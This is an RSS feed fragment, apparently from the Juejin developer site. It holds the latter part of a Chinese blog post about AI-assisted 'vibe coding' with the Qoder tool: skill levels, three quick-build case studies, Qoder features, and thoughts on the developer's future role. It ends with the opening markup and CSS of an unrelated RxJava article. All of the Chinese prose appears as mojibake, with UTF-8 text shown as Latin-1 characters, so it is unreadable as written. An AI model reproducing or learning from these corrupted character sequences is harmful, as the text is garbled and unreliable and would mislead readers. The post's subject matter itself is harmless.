<p>å› æ­¤ï¼Œåœ¨äººæœºåä½œä¸­ï¼Œæˆ‘ä»¬å¿…é¡»æ˜ç¡®å„è‡ªçš„è¾¹ç•Œï¼šäººè´Ÿè´£"ä¸ºä»€ä¹ˆ"å’Œ"åšä»€ä¹ˆ"ï¼ŒAIè´Ÿè´£"æ€ä¹ˆåš"ã€‚åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿè¦ä¿æŒå¯¹AIè¾“å‡ºçš„éªŒè¯æ„è¯†ï¼Œå› ä¸ºAIå­˜åœ¨"å¹»è§‰"é—®é¢˜ï¼Œå¯èƒ½ä¼šç”Ÿæˆçœ‹ä¼¼åˆç†ä½†å®é™…é”™è¯¯çš„å†…å®¹ã€‚</p>
<h3 data-id="heading-4">æå‡AIä½¿ç”¨èƒ½åŠ›çš„ä¸‰ä¸ªå±‚æ¬¡</h3>
<p>æœ‰æ•ˆåˆ©ç”¨AIç¼–ç¨‹å·¥å…·éœ€è¦ç»å†ä¸‰ä¸ªèƒ½åŠ›æå‡é˜¶æ®µï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e9714097fb04ce3bc971bbc20d7d9e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=oUQj4ugGw4%2FBbOJgoMMHo6wDRww%3D" alt="" loading="lazy"/></p>
<ol>
<li>ç”¨Â·æŠŠ AI å½“å·¥å…·<br/>
æŠŠå°†AIä½œä¸ºé—®ç­”å·¥å…·ï¼Œè¿›è¡Œç®€å•çš„ä»£ç ç”Ÿæˆå’Œé—®é¢˜è§£ç­”ã€‚è¿™æ˜¯å¤§å¤šæ•°å¼€å‘è€…çš„èµ·ç‚¹ï¼Œä½†æ•ˆç‡æå‡æœ‰é™ã€‚</li>
<li>é©­Â·æŠŠ AI å½“åŠ©æ‰‹<br/>
å°†AIè§†ä¸ºæ™ºèƒ½åŠ©æ‰‹ï¼Œè¿ç”¨"æ€ç»´æ ‘"ï¼ˆTree of Thoughtsï¼‰ç­‰æŠ€å·§ï¼Œè®©AIæ‰®æ¼”ä¸åŒè§’è‰²ï¼ˆæ¶æ„å¸ˆã€äº§å“ç»ç†ã€æµ‹è¯•å·¥ç¨‹å¸ˆï¼‰è¿›è¡Œå¤šè½®è®¨è®ºã€‚åŒæ—¶ï¼Œå……åˆ†åˆ©ç”¨ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œè®©AIæ›´å¥½åœ°ç†è§£é¡¹ç›®èƒŒæ™¯ã€‚<br/>
Qoder ç›®å‰æ”¯æŒä¸Šä¸‹æ–‡å·¥ç¨‹ï¼Œä½ å¯ä»¥å°†ä¸Šä¸‹æ–‡ä¸¢ç»™ Qoderï¼Œè®© Qoder å¸®ä½ åˆ†æï¼Œè¾“å‡ºã€‚è¿˜æœ‰å°±æ˜¯å¤æ‚ä»»åŠ¡çš„æ‹†è§£ï¼Œå‘¼åå¤§å®¶éƒ½ä½¿ç”¨ä¸‹ OpenSpecï¼Œè®© Qoder å»æ‹†è§£ä¸€äº›æ„å›¾ã€‚æˆ‘ä¹‹å‰å°±æ˜¯åšäº§å“ç»ç†çš„ï¼Œå¯èƒ½å­å“§å­å“§è¦å†™ä¸€å¤©æ—¶é—´ï¼Œä½† Qoder åªç”¨äº”åˆ†é’Ÿå°±å¯ä»¥å¸®ä½ æ‹†è§£æ‰ã€‚</li>
<li>åˆÂ·äººæœºä¸€ä½“ ç†æƒ³çš„è¯å°±æ˜¯æ¯ä¸€ä¸ªåœ°æ–¹éƒ½æœ‰ AI ï¼Œè®© AI æ·±åº¦çš„å»å‚ä¸å†³ç­–ã€æ‰§è¡Œï¼Œæœ€ç»ˆè¾¾åˆ°äººæœºè¾¹ç•Œçš„æ¨¡ç³ŠçŠ¶æ€ã€‚å¼€å‘è€…ä¸“æ³¨äºé«˜å±‚æ¬¡çš„å†³ç­–å’Œåˆ›æ–°ï¼Œè€Œå°†å…·ä½“çš„å®ç°ç»†èŠ‚å®Œå…¨äº¤ç»™AIå¤„ç†ã€‚</li>
</ol>
<p>é“çš„æ ¸å¿ƒæ˜¯äººçš„ä¸å¯æ›¿ä»£æ€§ï¼Œäººè¦è´Ÿè´£çš„ï¼Œä¸æ˜¯éæ­¤å³å½¼ï¼Œæˆ–è€…æ˜¯è°å–ä»£è°ï¼Œè€Œæ˜¯å¦‚ä½•å°†1+1&gt;2çš„ååŒæ•ˆåº”æœ€å¤§åŒ–ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed8bd77b80724842ba78e2fc9e69b8b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=RGkZQfHU2d9LfUahvFYmWzKNFcw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">03 å®æˆ˜ä¹‹æœ¯ï¼šäººæœºåä½œçš„ä¿®ç‚¼åœº</h2>
<p>æˆ‘åœ¨å¤šä¸ªé¡¹ç›®ä¸­éªŒè¯äº† AI ç¼–ç¨‹çš„å¯è¡Œæ€§ï¼š</p>
<h3 data-id="heading-6">æ¡ˆä¾‹ä¸€ï¼šä¿®ä»™æ¨¡æ‹Ÿå™¨çš„å¿«é€Ÿå¼€å‘</h3>
<p>æˆ‘ä½¿ç”¨ Qoder å¼€å‘äº†ä¸€ä¸ªä¿®ä»™æ¨¡æ‹Ÿå™¨ï¼Œè¿™ä¸ªåº”ç”¨åŒ…å«è§’è‰²åˆ›å»ºã€å±æ€§åˆ†é…ã€ä¿®ç‚¼çªç ´ã€å¤©åŠ«æŒ‘æˆ˜ç­‰å®Œæ•´çš„æ¸¸æˆæœºåˆ¶ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73a9d6efcb5d40218c0965a5737fd8c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=IhVWGN9rMBUH8vK3LObprt3Kgaw%3D" alt="" loading="lazy"/></p>
<p>æ•´ä¸ªå¼€å‘è¿‡ç¨‹å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<ul>
<li>å¼€å‘æ—¶é—´ï¼šä¸åˆ°1å°æ—¶å®Œæˆ</li>
<li>æŠ€æœ¯æ ˆï¼šçº¯å‰ç«¯å®ç°</li>
<li>ä»£ç è´¨é‡ï¼šæ— æ˜æ˜¾çš„"AIå‘³"ï¼Œç”¨æˆ·ä½“éªŒæµç•…è‡ªç„¶</li>
</ul>
<p>åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæˆ‘é‡‡ç”¨äº†ä»¥ä¸‹ç­–ç•¥ï¼š</p>
<ol>
<li>æ˜ç¡®æŒ‡å®šä½¿ç”¨å‰ç«¯æŠ€æœ¯æ ˆå’Œæœ€ä½³å®è·µ</li>
<li>åº”ç”¨OpenSpecè¿›è¡Œéœ€æ±‚æ‹†è§£å’Œè§„æ ¼å®šä¹‰</li>
<li>å……åˆ†åˆ©ç”¨Qoderçš„ä¸Šä¸‹æ–‡ç†è§£å’Œè®°å¿†åŠŸèƒ½</li>
<li>ä»¥æ•ˆç‡ä¸ºä¼˜å…ˆè€ƒè™‘ï¼Œæˆæœ¬å…¶æ¬¡</li>
</ol>
<p>è¿™ä¸ªæ¡ˆä¾‹å……åˆ†è¯æ˜äº†AIç¼–ç¨‹åœ¨å¿«é€ŸåŸå‹å¼€å‘æ–¹é¢çš„å·¨å¤§ä¼˜åŠ¿ï¼Œå³ä½¿æ˜¯æ¸¸æˆè¿™æ ·ç›¸å¯¹å¤æ‚çš„äº¤äº’åº”ç”¨ï¼Œä¹Ÿèƒ½åœ¨æçŸ­æ—¶é—´å†…å®Œæˆé«˜è´¨é‡å®ç°ã€‚</p>
<h3 data-id="heading-7">æ¡ˆä¾‹äºŒï¼šWindows 95æ¨¡æ‹Ÿå™¨çš„å®Œç¾å¤åˆ»</h3>
<p>å¦ä¸€ä¸ªæ¡ˆä¾‹æ˜¯ä½¿ç”¨ Qoder å¼€å‘ Windows 95æ¨¡æ‹Ÿå™¨ã€‚è¿™ä¸ªé¡¹ç›®å®ç°äº†é›¶ä¿®æ”¹ã€é›¶æŠ¥é”™çš„ä¸€æ¬¡æ€§æˆåŠŸã€‚ä¸ä»…é‡ç°äº†ç»å…¸çš„æ¡Œé¢ç•Œé¢ï¼Œè¿˜åŒ…å«äº†å®Œæ•´çš„åº”ç”¨ç¨‹åºç”Ÿæ€ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>AIè®°äº‹æœ¬ï¼ˆæ”¯æŒæ–‡æœ¬ç”Ÿæˆå’Œæ¶¦è‰²ï¼‰</li>
<li>æ‰«é›·ç­‰å°æ¸¸æˆï¼ˆç»å…¸Windowsæ¸¸æˆçš„å®Œæ•´å®ç°ï¼‰</li>
<li>ç³»ç»Ÿèœå•å’Œçª—å£ç®¡ç†</li>
</ul>
<p>æ•´ä¸ªç³»ç»Ÿç•Œé¢çœ‹èµ·æ¥æ²¡æœ‰ä»»ä½• Vibe Coding çš„å‘³ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0eecb4e806047ec8c5aee802a5f4a53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=lNfSErNiJf1mREjpwvGw5qDQC4U%3D" alt="" loading="lazy"/></p>
<p>è¿™é‡Œåˆ†äº«ä¸€ä¸ª AI Coding çš„å…³é”®æŠ€å·§ï¼Œå°±å››ä¸ªå­—ï¼šæœ€ä½³å®è·µã€‚æ¯”å¦‚æˆ‘æƒ³å¼€å‘ä¸€ä¸ª Windows 95 é£æ ¼çš„åº”ç”¨ï¼Œæˆ‘ä¼šå…ˆæ˜ç¡®æŒ‡å®šå‰ç«¯æŠ€æœ¯æ ˆï¼ˆæ¯”å¦‚ React æˆ– Vueï¼‰ï¼Œç„¶ååœ¨æŒ‡ä»¤ä¸­å¼ºè°ƒï¼šâ€œè¯·ç»“åˆè¯¥æŠ€æœ¯æ ˆçš„æœ€ä½³å®è·µæ¥å®ç°â€ã€‚è¿™æ ·ä¸€æ¥ï¼ŒQoder ç”Ÿæˆçš„ä»£ç ä¼šæ›´è§„èŒƒã€æ›´è´´è¿‘çœŸå®å·¥ç¨‹æ ‡å‡†ã€‚å†é…åˆ OpenSpec çš„ Proposal å’Œ Apply æµç¨‹ï¼ŒåŸºæœ¬èƒ½ä¸€æ¬¡æˆå‹ï¼Œå¤§å¹…å‡å°‘åæœŸä¿®æ”¹ã€‚</p>
<h3 data-id="heading-8">æ¡ˆä¾‹ä¸‰ï¼šAI Chat çš„å¼€å‘</h3>
<p>è¿™ä¸ªé¡¹ç›®æ˜¯ä½¿ç”¨ Qoder å¼€å‘ä¸€ä¸ªç±»ä¼¼ Deepseek çš„ AI Chat ã€‚æ‰“å¼€â€œæ·±åº¦æ€è€ƒâ€æ¨¡å¼ã€‚å°±ä¼šå¯ç”¨GLM-4.6çš„thinkingåŠŸèƒ½ï¼Œè®©AIè¿›è¡Œå……åˆ†çš„è‡ªæˆ‘åæ€å’Œä¼˜åŒ–ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/308fe16d50024167a3960a5e1309b613~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=uTsufOjq2F0jKaBY1t%2BHRhFkaks%3D" alt="" loading="lazy"/></p>
<p>åˆ†äº«ä¸€ä¸ªå’Œ AI å¯¹è¯çš„å°æŠ€å·§ï¼šå¦‚æœ AI è¾“å‡ºçš„ç»“æœä½ ä¸æ»¡æ„ï¼Œå°±é—®å®ƒä¸€å¥ï¼šâ€œä½ ç¡®å®šå—ï¼Ÿâ€ç­‰å®ƒé‡æ–°å›ç­”åï¼Œå†è¿½é—®ä¸€å¥ï¼šâ€œä½ çœŸçš„ç¡®å®šå—ï¼Ÿâ€</p>
<p>é€šå¸¸ç»è¿‡è¿™ä¸¤è½®è‡ªæˆ‘åæ€ï¼ŒAI å°±ä¼šç»™å‡ºæ˜æ˜¾æ›´ä¼˜çš„ç­”æ¡ˆï¼Œå¤§å®¶å¯ä»¥è¯•è¯•çœ‹ã€‚</p>
<h3 data-id="heading-9">Qoder é«˜çº§ç‰¹æ€§</h3>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ç»™å¤§å®¶åˆ†äº«ä¸‹Qoder çš„ä¸€äº›æ¯”è¾ƒå¥½çš„é«˜çº§ç‰¹æ€§ï¼Œèƒ½å¤Ÿæ˜¾è‘—æå‡å¼€å‘æ•ˆç‡ï¼š</p>
<ol>
<li>è§„åˆ™é…ç½®</li>
</ol>
<p>Qoder æ”¯æŒä¸ºæ¯ä¸ªé¡¹ç›®é…ç½®ä¸“å±è§„åˆ™ã€‚è§„åˆ™å­˜æ”¾äºÂ <code>.qoder/rules</code>Â ç›®å½•ä¸­ï¼Œä»…å¯¹å½“å‰é¡¹ç›®ç”Ÿæ•ˆã€‚è§„åˆ™å¯ä¼˜åŒ–æ¨¡å‹å¯¹ä½ çš„ç¼–ç åå¥½çš„é€‚é…ï¼ŒåŒ…æ‹¬é¡¹ç›®æ‰€ç”¨æ¡†æ¶ä¸ä»£ç é£æ ¼ã€‚</p>
<p>ä½¿ç”¨ Qoder æ—¶ï¼Œå»ºè®®ä¸è¦å…ˆå»ç¼–ç ï¼Œåº”è¯¥å…ˆé…ç½®è§„åˆ™ï¼Œåˆç†é…ç½®è§„åˆ™å¯ä»¥é¿å…ç”Ÿæˆä½è´¨é‡ä»£ç ï¼ŒèŠ‚çœåç»­ä¿®æ”¹æ—¶é—´ã€‚</p>
<ol start="2">
<li>MCPé…ç½®</li>
</ol>
<p>MCP é€šè¿‡æ ‡å‡†åŒ–æ¥å£ä½¿ Qoder æ™ºèƒ½ä½“èƒ½å¤Ÿè¿æ¥åˆ°å„ç±»å¤–éƒ¨ç³»ç»Ÿå’Œæ•°æ®æºï¼Œä»è€Œå¢å¼ºæ™ºèƒ½ä½“çš„èƒ½åŠ›ã€‚</p>
<p>Qoder æ”¯æŒ 2 ç§é…ç½® MCP çš„æ–¹å¼ï¼š</p>
<ul>
<li>æ‰‹åŠ¨æ·»åŠ ï¼šå°†å¼€æºçš„ MCP æˆ–è€…å¸¸ç”¨çš„ä¼ä¸šæœåŠ¡å°è£…ä¸ºMCPï¼Œä¾¿äº Qoder è°ƒç”¨ã€‚</li>
<li>MCP å¹¿åœºæ·»åŠ ï¼šQoder ä¼šåœ¨ MCP å¹¿åœºé¢„ç½®äº†ä¸€äº›å¸¸ç”¨çš„ MCPï¼Œä¾‹å¦‚ï¼šSequential Thinkingã€Figma ç­‰ï¼Œä½ å¯ä»¥ä¸€é”®å®‰è£…ã€‚</li>
</ul>
<ol start="3">
<li>è®°å¿†ç³»ç»Ÿ</li>
</ol>
<p>Qoder å…·å¤‡é•¿æœŸè®°å¿†èƒ½åŠ›ã€‚éšç€ä½ æŒç»­ä½¿ç”¨ï¼Œå®ƒä¼šè‡ªåŠ¨ç§¯ç´¯å¹¶æ›´æ–°ä½ çš„ä¸ªäººåå¥½ã€é¡¹ç›®ä¸Šä¸‹æ–‡ã€è¸©è¿‡çš„å‘å’Œæœ‰æ•ˆçš„è§£å†³æ–¹æ¡ˆï¼Œå½¢æˆä¸€å¥—åŠ¨æ€æ¼”è¿›çš„è®°å¿†åº“ï¼Œå¹¶åœ¨åç»­ä»»åŠ¡ä¸­æ™ºèƒ½è°ƒç”¨â€”â€”çœŸæ­£åšåˆ°è¶Šç”¨è¶Šæ‡‚ä½ ã€‚</p>
<ol start="4">
<li>Repo Wiki</li>
</ol>
<p>Repo Wiki èƒ½å¸®ä½ å¿«é€Ÿæ¢³ç†å†å²é¡¹ç›®çš„æ•´ä½“é€»è¾‘ï¼Œå°¤å…¶å¯¹æ–°æˆå‘˜éå¸¸å‹å¥½ã€‚åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæ— è®ºæ˜¯æŸ¥è¯¢çŸ¥è¯†ç‚¹ã€ç†è§£ä»£ç ï¼Œè¿˜æ˜¯æ–°å¢åŠŸèƒ½ï¼Œå®ƒéƒ½ä¼šæ·±å…¥åˆ†æé¡¹ç›®ç»“æ„ä¸å®ç°ç»†èŠ‚ï¼Œç»“åˆä»£ç åº“ä¸Šä¸‹æ–‡ï¼Œæä¾›æ›´å‡†ç¡®ã€è¯¦å°½çš„è§£ç­”å’Œæ–‡æ¡£æ”¯æŒï¼Œè®© Qoder çœŸæ­£â€œè¯»æ‡‚â€ä½ çš„ä»£ç åº“ã€‚</p>
<p>è¿™äº›é«˜çº§åŠŸèƒ½çš„ç»„åˆä½¿ç”¨ï¼Œä½¿å¾— Qoder ä¸ä»…ä»…æ˜¯ä¸€ä¸ªä»£ç ç”Ÿæˆå·¥å…·ï¼Œè€Œæ˜¯ä¸€ä¸ªå®Œæ•´çš„æ™ºèƒ½å¼€å‘ç¯å¢ƒã€‚</p>
<h2 data-id="heading-10">04 æœªæ¥ä¹‹æƒ³ï¼šAI æ—¶ä»£ï¼Œä½•ä»¥ä¸ºäºº</h2>
<p>åŸºäºä¸€å¹´å¤šçš„å®è·µï¼Œæˆ‘å¯¹æœªæ¥æœ‰äº”ç‚¹æ€è€ƒï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7105fa6431c45d19ba5a110c603e0b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=AKKkZ5W6yPIIYx%2Fo%2Bsrbse0mjzk%3D" alt="" loading="lazy"/></p>
<ol>
<li>èƒ½åŠ›é‡å¡‘ï¼šå¼€å‘è€…çš„æ ¸å¿ƒèƒ½åŠ›ä»â€œä¼šå†™ä»£ç â€è½¬å‘â€œä¼šé©¾é©­ AIâ€ï¼Œæç¤ºå·¥ç¨‹æˆä¸ºæ–°ç´ å…»ï¼›</li>
<li>è§’è‰²è¿›åŒ–ï¼šä» Coder å˜ä¸º Creatorï¼Œä»æ‰§è¡Œè€…å˜ä¸ºå†³ç­–è€…ï¼Œä»ç‹¬è¡Œä¾ å˜ä¸ºâ€œäººæœºå›¢é˜Ÿâ€çš„æŒ‡æŒ¥å®˜ï¼›</li>
<li>ä»·å€¼é”šå®šï¼šæŠ€æœ¯å®ç°å¯å¤–åŒ…ç»™ AIï¼Œä½†åˆ¤æ–­åŠ›ã€è´£ä»»æ„Ÿã€åˆ›æ–°ã€åˆ›æ„ã€åŒç†å¿ƒæ°¸è¿œå±äºäººï¼›</li>
<li>ç»ˆèº«å­¦ä¹ ï¼šAI è¿›åŒ–é€Ÿåº¦è¿œè¶…äººç±»ï¼Œå”¯æœ‰ä¿æŒå¥½å¥‡å¿ƒå’Œå­¦ä¹ åŠ›æ‰èƒ½ä¸è¢«æ·˜æ±°ï¼›</li>
<li>ä¿æŒäººæ€§ï¼šåœ¨æ•ˆç‡è‡³ä¸Šçš„æ—¶ä»£ï¼Œå®ˆæŠ¤äººçš„æ¸©åº¦â€”â€”æŠ€æœ¯æ˜¯æ‰‹æ®µï¼Œäººçš„å¹¸ç¦æ‰æ˜¯ç›®çš„ã€‚</li>
</ol>
<p>AI ä¸æ˜¯å–ä»£äººï¼Œè€Œæ˜¯æ”¾å¤§äººçš„èƒ½åŠ›ï¼Œå¹¶å°†æˆæœ¬é™ä½åå€ã€‚å…³é”®åœ¨äºï¼Œä½ æ˜¯å¦æ„¿æ„æ‹¥æŠ±è¿™ä¸€å˜åŒ–ï¼Œé‡æ–°å®šä¹‰è‡ªå·±çš„è§’è‰²ä¸ä»·å€¼ã€‚</p>
<h2 data-id="heading-11">å†™åœ¨æœ€å</h2>
<p>Vibe Codingä¸ä»…ä»…æ˜¯ä¸€ç§æ–°çš„ç¼–ç¨‹æŠ€æœ¯ï¼Œæ›´æ˜¯ä¸€ç§å…¨æ–°çš„æ€ç»´æ–¹å¼å’Œå·¥ä½œå“²å­¦ã€‚å®ƒè¦æ±‚æˆ‘ä»¬é‡æ–°æ€è€ƒäººä¸æŠ€æœ¯çš„å…³ç³»ï¼Œé‡æ–°å®šä¹‰å¼€å‘è€…çš„è§’è‰²å’Œä»·å€¼ã€‚</p>
<p>åœ¨è¿™ä¸ªäººæœºåä½œçš„æ–°æ—¶ä»£ï¼ŒæˆåŠŸçš„å…³é”®ä¸åœ¨äºæŠ—æ‹’å˜åŒ–ï¼Œè€Œåœ¨äºæ‹¥æŠ±å˜åŒ–ï¼Œåœ¨å˜åŒ–ä¸­æ‰¾åˆ°è‡ªå·±çš„ç‹¬ç‰¹å®šä½ã€‚</p>
<p>æŠ€æœ¯å¯ä»¥å¤–åŒ…ç»™AIï¼Œä½†åˆ¤æ–­ã€è´£ä»»ã€åˆ›æ–°ã€åˆ›æ„ã€åŒç†å¿ƒæ°¸è¿œå±äºäººã€‚</p>
<p>è®©æˆ‘ä»¬ä»¥å¼€æ”¾çš„å¿ƒæ€è¿æ¥è¿™ä¸ªæ–°æ—¶ä»£ï¼Œåœ¨AIçš„åŠ©åŠ›ä¸‹åˆ›é€ å‡ºæ›´åŠ ç¾å¥½çš„æ•°å­—ä¸–ç•Œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å“åº”å¼ç¼–ç¨‹ä¸åªæœ‰æ¦‚å¿µï¼ä¸‡å­—é•¿æ–‡ + ä»£ç ç¤ºä¾‹ï¼Œæ‰‹æŠŠæ‰‹å¸¦ä½ ç©è½¬ RxJava]]></title>    <link>https://juejin.cn/post/7588095884070273024</link>    <guid>https://juejin.cn/post/7588095884070273024</guid>    <pubDate>2025-12-28T01:07:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588095884070273024" data-draft-id="7588093282530770996" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å“åº”å¼ç¼–ç¨‹ä¸åªæœ‰æ¦‚å¿µï¼ä¸‡å­—é•¿æ–‡ + ä»£ç ç¤ºä¾‹ï¼Œæ‰‹æŠŠæ‰‹å¸¦ä½ ç©è½¬ RxJava"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-28T01:07:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Javaéšæƒ³å½•"/> <meta itemprop="url" content="https://juejin.cn/user/2837192913204935"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å“åº”å¼ç¼–ç¨‹ä¸åªæœ‰æ¦‚å¿µï¼ä¸‡å­—é•¿æ–‡ + ä»£ç ç¤ºä¾‹ï¼Œæ‰‹æŠŠæ‰‹å¸¦ä½ ç©è½¬ RxJava
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2837192913204935/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Javaéšæƒ³å½•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T01:07:20.000Z" title="Sun Dec 28 2025 01:07:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»29åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 